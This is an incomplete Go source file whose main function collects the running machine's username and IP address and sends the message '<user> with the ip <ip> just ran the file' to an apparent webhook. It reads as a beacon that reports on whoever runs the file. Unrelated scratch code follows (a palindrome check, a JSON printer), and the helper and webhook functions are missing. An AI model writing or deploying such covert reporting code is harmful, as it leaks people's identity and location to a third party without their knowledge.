package main

import (
	"encoding/json"
	"fmt"
)

func main() {
	var messageContent string
	var pcUsername string = getPcUsername()
	var ip string = getIp()
	const thing string = "fdsfsf"
	messageContent = fmt.Sprintf("%s with the ip %s just ran the file", pcUsername, ip)
	//timeIt()
	webhook(messageContent)
	println(getIp())
}

func dojson(str string) {
	var result map[string]string
	err := json.Unmarshal([]byte(str), &result)
	DoErr(&err)

	for key, value := range result {
		println(key, ": ", value)
	}
}

func isPalindrome(x int) bool {

	var reversed int
	temp := x
	for temp > 0 {
		reversed = reversed*10 + temp%10
		temp /= 10
	}
	return reversed == x
}

func DoErr(err *error) {
	if *err != nil {
		print((*err).Error())
	}
}
